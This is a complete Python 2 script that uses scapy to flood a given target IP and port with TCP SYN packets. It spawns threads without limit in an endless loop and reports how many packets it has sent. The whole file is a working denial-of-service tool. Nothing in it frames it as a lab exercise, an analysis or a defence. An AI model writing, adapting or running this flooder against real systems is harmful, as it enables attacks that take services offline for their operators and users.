import socket, random, sys, threading
import netifaces as ni
from scapy.all import *

if len(sys.argv) != 4:
	print "Usage : sudo %s <Target IP> <Port> <interface>" % sys.argv[0]
	sys.exit(1)


target = sys.argv[1]
port = int(sys.argv[2])
ip = ni.ifaddresses(sys.argv[3])[ni.AF_INET][0]['addr']
total = 0
conf.iface=sys.argv[3]


class sendSYN(threading.Thread):
	global target, port, ip
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		i = IP()
		i.src = ip
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

print "Flooding %s:%i with SYN packets." % (target, port)
while 1:
	sendSYN().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
